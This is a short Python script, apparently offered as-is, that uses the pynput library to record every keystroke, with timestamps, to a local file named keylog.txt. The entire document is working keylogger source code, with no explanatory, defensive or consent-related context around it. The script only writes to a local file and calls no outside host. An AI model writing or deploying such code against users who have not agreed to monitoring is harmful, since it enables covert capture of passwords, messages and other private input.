from pynput import keyboard
import logging

# Set the path to save the log file
log_file_path = "keylog.txt"

# Configure logging
logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to handle key press events
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Start listening to keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
